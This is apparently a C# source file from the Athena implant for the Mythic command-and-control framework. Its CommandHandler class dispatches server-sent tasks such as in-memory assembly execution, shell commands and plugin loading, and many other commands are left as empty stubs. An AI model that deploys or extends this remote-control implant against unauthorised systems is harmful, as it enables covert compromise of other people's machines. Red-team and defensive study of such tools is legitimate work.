using Athena.Models.Mythic.Tasks;
using PluginBase;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Text;

namespace Athena.Commands
{
    public class CommandHandler
    {
        private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
        private AssemblyHandler assemblyHandler { get; set; }
        private ConcurrentBag<object> responseResults { get; set; }
        public CommandHandler()
        {
            this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
            this.assemblyHandler = new AssemblyHandler();
            this.responseResults = new ConcurrentBag<object>();
        }

        public async Task StartJob(MythicTask task)
        {
            MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
            job.started = true;
            Task t;

            switch (job.task.command)
            {
                case "download": //Can likely be dynamically loaded
                    break;
                case "execute-assembly":
                    this.responseResults.Add(assemblyHandler.ExecuteAssembly(job));
                    break;
                case "exit":
                    Environment.Exit(0);
                    break;
                case "jobs": //Can likely be dynamically loaded
                    this.responseResults.Add(await this.GetJobs(task.id));
                    break;
                case "jobkill": //Maybe can be loaded? //Also add a kill command for processes
                    break;
                case "link":
                    break;
                case "load":
                    this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
                    break;
                case "load-assembly":
                    break;
                case "reset-assembly-context":
                    break;
                case "shell": //Can be dynamically loaded
                    this.responseResults.Add(await Execution.ShellExec(job));
                    break;
                case "sleep":
                    break;
                case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
                    break;
                case "stop-assembly":
                    break;
                case "unlink":
                    break;
                case "upload": //Can likely be dynamically loaded
                    break;
                case "stop":
                    break;
                default:
                    this.responseResults.Add(await checkAndRunPlugin(job));
                    break;
            }
            this.activeJobs.Remove(task.id, out _);
        }

        public async Task StopJob(MythicTask task)
        {
            //todo
        }

        public async Task<List<object>> GetResponses()
        {
            List<object> responses = this.responseResults.ToList<object>();
            this.responseResults.Clear();
            return responses;
        }
        public async Task AddResponse(object response)
        {
            this.responseResults.Add(response);
        }
        public async Task AddResponse(List<object> responses)
        {
            foreach(object response in responses)
            {
                this.responseResults.Prepend<object>(response); //Add to the beginning in case another task result returns
            }
        }
        private async Task<object> GetJobs(string task_id)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var j in this.activeJobs)
            {
                sb.AppendLine($"{{\"id\":\"{j.Value.task.id}\",");
                sb.AppendLine($"\"command\":\"{j.Value.task.command}\",");
                if (j.Value.started & !j.Value.complete)
                {
                    sb.AppendLine($"\"status\":\"Started\"}},");
                }
                else
                {
                    sb.AppendLine($"\"status\":\"Queued\"}},");
                }
            }

            return new ResponseResult()
            {
                user_output = sb.ToString(),
                task_id = task_id,
                completed = "true"
            };
        }

        /// <summary>
        /// Determine if a Mythic command is loaded, if it is, run it
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        private async Task<object> checkAndRunPlugin(MythicJob job)
        {
            if (await this.assemblyHandler.CommandIsLoaded(job.task.command))
            {
                return await this.assemblyHandler.RunLoadedCommand(job);
            }
            else
            {
                return new ResponseResult()
                {
                    completed = "true",
                    user_output = "Plugin not loaded. Please use the load command to load the plugin!",
                    task_id = job.task.id,
                    status = "error",
                };
            }
        }
    }
}
